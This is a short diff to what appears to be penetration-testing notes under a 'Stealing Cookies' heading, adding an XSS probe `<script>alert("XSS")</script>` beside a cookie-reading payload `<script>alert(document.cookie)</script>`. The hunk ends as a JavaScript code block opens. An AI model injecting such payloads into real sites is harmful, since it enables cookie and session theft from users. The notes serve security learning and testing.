@@ -659,6 +659,7 @@ Stealing Cookies:
 - Uses JavaScript
 - Test: 
 	- Try using basic HTML tags, such as `<b>` or `<i>`.
+	- See if Javascript is usable with `<script>alert("XSS")</script>`
 	- See if cookie is viewable with `<script>alert(document.cookie)</script>`
 ``` javascript
 <script>
